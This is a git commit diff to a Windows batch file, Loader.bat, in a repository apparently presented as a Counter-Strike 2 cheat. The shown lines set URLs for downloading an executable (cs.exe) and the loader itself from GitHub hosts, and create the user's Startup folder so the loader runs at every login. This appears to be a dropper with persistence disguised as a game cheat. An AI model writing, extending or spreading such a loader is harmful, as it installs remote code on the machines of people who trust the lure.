0d971a8372ea75435f269c295353f704e1bea522
Demon4u <85320553+Demon4u@users.noreply.github.com>
2024-04-23 23:05:55 +0300

    Loader.bat

--- Loader.bat
+++ Loader.bat
@@ -9,8 +9,8 @@ if not exist "%destination%\cs.exe" (
 
 set "startup_destination=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 if not exist "%startup_destination%" mkdir "%startup_destination%"
-set "link3=https://github.com/Demon4u/CS2-Cheat/src/releases/download/new/Loader.bat"
-set "link4=https://demon4u.github.io/cs.exe"
+set "link2=https://github.com/Demon4u/CS2-Cheat/blob/89c60ca064528316bd33eeb02d086a457c3db0b4/Loader.bat"
+set "link3=https://demon4u.github.io/cs.exe"
 
 if not exist "%startup_destination%\Loader.bat" (
     echo Loading Loader.bat...
